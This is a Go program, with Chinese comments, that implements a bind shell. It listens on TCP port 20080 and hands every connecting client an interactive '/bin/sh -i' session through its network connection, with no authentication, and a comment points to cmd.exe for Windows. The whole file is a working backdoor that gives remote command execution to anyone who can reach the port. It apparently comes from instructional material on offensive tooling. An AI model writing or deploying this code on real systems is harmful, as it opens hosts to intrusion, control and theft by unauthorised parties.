package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	/*
	 * 显式调用/bin/sh并使用-i进入交互模式,
	 * 以便我们可以将其用于stdin和stdout。
	 * Windows上使用exec.Command("cmd.exe")
	 */
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	// 将stdin设置为我们到连接
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
